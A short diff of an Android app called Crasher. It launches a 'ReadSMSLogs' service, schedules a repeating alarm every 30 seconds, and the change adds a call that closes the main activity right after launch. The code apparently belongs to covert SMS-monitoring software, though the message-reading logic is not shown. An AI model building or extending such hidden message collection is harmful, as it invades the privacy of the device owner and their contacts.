@@ -2,18 +2,20 @@ package com.bigeye.crasher;
 
 import java.util.Calendar;
 
-import android.os.Bundle;
 import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.util.Log;
 import android.view.Menu;
 
 public class Crasher extends Activity {
 
 	private static final long REPEAT_TIME = 1000 * 30;
+	private final String APP_TAG = getClass().getName();
 	SharedPreferences prefs;
 	String prefName = "AllLogs";
 	
@@ -40,6 +42,9 @@ public class Crasher extends Activity {
 		
 		//start read sms log service
 		startService(new Intent(this, ReadSMSLogs.class));
+		
+		Log.i(APP_TAG,"closing main activity!");
+		finish();
 	}
 
 	@Override
